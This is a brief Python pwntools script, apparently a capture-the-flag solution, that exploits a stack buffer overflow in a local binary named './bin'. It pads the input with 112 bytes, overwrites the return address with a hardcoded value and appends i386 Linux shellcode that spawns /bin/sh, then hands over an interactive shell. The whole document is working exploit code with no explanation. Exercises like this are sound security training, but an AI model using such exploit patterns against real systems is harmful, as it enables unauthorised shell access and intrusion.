from pwn import *
context.log_level = 'debug'

t = process('./bin')
shellcode = asm(shellcraft.i386.linux.sh())
t.recvuntil('**************************************\n')
t.sendline('a'*112 + p32(0x080484f0) + shellcode)

t.interactive()
